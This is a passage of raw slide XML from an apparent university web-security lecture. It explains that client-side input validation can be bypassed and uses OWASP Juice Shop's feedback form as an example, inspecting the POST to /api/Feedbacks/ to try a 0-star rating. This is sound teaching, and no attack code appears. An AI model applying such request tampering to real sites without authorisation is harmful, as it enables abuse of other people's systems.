              <a:rPr dirty="0" spc="-75"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>be</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-75"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>completely</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-95"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>avoided</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-70"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t>by 	attackers,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-65"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>who</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-55"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>can</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-50"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>access</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-65"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>and</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>manipulate</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-45"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>client-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>side</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>code,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-55"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t>or </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>generate</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-95"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-65"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>requests</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-50"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>directly!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="625"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Validation</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-70"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>should</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" b="1">
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>always</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-50" b="1">
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>be</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-70"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>performed</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-45"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" b="1">
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>also</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-60" b="1">
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>on</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-65"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-55"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25" b="1">
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>server-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10" b="1">
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>side</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>!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EVADING</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="10"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>INPUT</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t> VALIDATION</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="object 3" descr="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60325" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="3494404" marR="306070" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3030"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="475"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="3496310" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>In</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-75"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-60"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>OWASP</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-50"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-55"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-50"/>
              <a:t>Tech</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-70"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>and</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-60"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Juice</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-60"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Shop, 	customers</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-65"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>can</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-85"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>leave</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-95"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>feedbacks</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-75"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-90"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-90"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>store</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="3494404" marR="5080" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3020"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1005"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="3496310" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>The</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-80"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>GUI</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-80"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>makes</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-80"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>sure</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-65"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>that</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-70"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>only</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-70"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>rating</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-65"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>between </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>and</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>5</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>can</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>be</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>selected.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="3494404" marR="108585" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3020"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1005"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="3496310" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Will</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-45"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>we</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-55"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>be</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>able</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-50"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>insert</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>a</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-45"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>devastating</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> 0-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>star </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>rating?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="4" name="object 4" descr=""/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="882396" y="1565147"/>
            <a:ext cx="3176270" cy="4612005"/>
            <a:chOff x="882396" y="1565147"/>
            <a:chExt cx="3176270" cy="4612005"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="5" name="object 5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82396" y="1565147"/>
              <a:ext cx="3176016" cy="4611624"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="6" name="object 6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889760" y="2353055"/>
              <a:ext cx="1499615" cy="219456"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="object 7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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="object 8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dirty="0" spc="-25"/>
              <a:t>41</a:t>
            </a:fld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EVADING</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="10"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>INPUT</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t> VALIDATION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4217034" y="1533220"/>
            <a:ext cx="6414770" cy="1348740"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="60325" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="240029" marR="5080" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3030"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="475"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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Upon</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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inserting</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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a</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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feedback,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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we</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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inspect</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>the </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>	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network</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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requests</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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in</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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Browser</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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Dev</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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Tools</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="620"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pP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A</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>POST</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-85" b="1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request</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>/api/Feedbacks/</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-40" b="1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is</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>sent</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="4" name="object 4" descr=""/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="882396" y="1565147"/>
            <a:ext cx="3176270" cy="4612005"/>
            <a:chOff x="882396" y="1565147"/>
            <a:chExt cx="3176270" cy="4612005"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="5" name="object 5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82396" y="1565147"/>
              <a:ext cx="3176016" cy="4611624"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="6" name="object 6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889760" y="2353055"/>
              <a:ext cx="1499615" cy="219456"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="7" name="object 7" descr=""/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4737671" y="2956179"/>
            <a:ext cx="5972175" cy="3230245"/>
            <a:chOff x="4737671" y="2956179"/>
            <a:chExt cx="5972175" cy="3230245"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="8" name="object 8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747260" y="2965704"/>
              <a:ext cx="5952744" cy="3156049"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="9" name="object 9" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4742434" y="2960941"/>
              <a:ext cx="5962650" cy="3220720"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="5962650" h="3220720">
                  <a:moveTo>
                    <a:pt x="0" y="3220593"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="5962269" y="3220593"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5962269" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="3220593"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="111F35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0" name="object 10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736080" y="5669280"/>
              <a:ext cx="603503" cy="141731"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="object 11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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="object 12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dirty="0" spc="-25"/>
              <a:t>41</a:t>
            </a:fld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6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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
